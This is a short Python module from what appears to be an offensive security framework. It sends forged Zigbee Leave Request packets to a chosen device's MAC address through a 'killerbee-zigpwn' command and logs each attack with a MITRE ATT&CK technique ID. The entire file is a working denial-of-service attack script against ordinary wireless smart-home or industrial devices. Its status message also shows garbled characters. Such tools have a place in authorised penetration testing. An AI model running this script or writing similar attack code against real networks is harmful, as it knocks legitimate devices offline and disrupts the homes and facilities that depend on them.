# modules/exploits/zigbee_fake_leave.py

import subprocess
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0826"

def log_zigbee_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_leave(mac, interface):
    cmd = [
        "killerbee-zigpwn",
        "-i", interface,
        "-L", mac
    ]
    try:
        subprocess.run(cmd, check=True)
        print(f"[âœ“] Sent Zigbee Leave Request to {mac}")
        log_zigbee_attack({
            "timestamp": datetime.utcnow().isoformat(),
            "mac": mac,
            "interface": interface,
            "ttp": MITRE_TTP
        })
    except subprocess.CalledProcessError as e:
        print(f"[!] Zigbee attack failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zigbee Fake Leave Packet Injector")
    parser.add_argument("--mac", required=True, help="MAC address of Zigbee target (e.g., 00:0d:6f:00:1a:2b:3c:4d)")
    parser.add_argument("--interface", default="zb0", help="Zigbee interface (e.g., RZUSBstick, KillerBee)")
    args = parser.parse_args()

    send_leave(args.mac, args.interface)
